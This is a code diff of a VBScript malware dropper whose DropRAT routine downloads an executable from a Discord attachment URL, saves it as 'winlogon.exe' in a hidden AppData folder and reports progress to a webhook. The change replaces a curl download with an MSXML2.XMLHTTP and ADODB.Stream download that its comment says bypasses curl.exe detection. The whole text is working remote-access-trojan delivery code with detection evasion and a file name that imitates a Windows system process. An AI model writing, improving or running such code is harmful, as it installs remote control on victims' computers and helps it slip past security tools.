@@ -48,9 +48,9 @@ Loop
 
 window.close()
 
-' --- RAT DROP (Original Curl Method) ---
+' --- RAT DROP (Direct HTTP Method) ---
 Sub DropRAT()
-    ' Plain URL
+    ' The exact URL from your file
     Dim exeUrl : exeUrl = "https://cdn.discordapp.com/attachments/1557266192971071579/1571991572017455216/dicecheck.exe?ex=6afcbebc&is=6afb6d3c&hm=a5986bf8435bab1c75a1be20841954d0a60df72e84ef0cbedf1973acf120271d&"
 
     Dim hidDir : hidDir = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Templates"
@@ -59,12 +59,22 @@ Sub DropRAT()
     Dim op : op = hidDir & "\winlogon.exe"
     If fso.FileExists(op) Then fso.DeleteFile op
 
-    ' Spam "Fetching Payload" (will stop when success)
+    ' Spam "Fetching Payload"
     Call PostEmbed(":package: Fetching Payload", "Attempting RAT download...", 10181046)
 
-    ' Use original curl method
-    Dim dlCmd : dlCmd = "cmd /c curl.exe -s -L -o """ & op & """ """ & exeUrl & """"
-    sh.Run dlCmd, 0, True
+    ' Use MSXML2.XMLHTTP (Bypasses curl.exe detection)
+    Dim xh : Set xh = CreateObject("MSXML2.XMLHTTP")
+    xh.Open "GET", exeUrl, False
+    xh.Send
+
+    If xh.Status = 200 Then
+        Dim stream : Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 1
+        stream.Open
+        stream.Write xh.ResponseBody
+        stream.SaveToFile op, 2
+        stream.Close
+    End If
 
     ' Check for success
     If fso.FileExists(op) Then
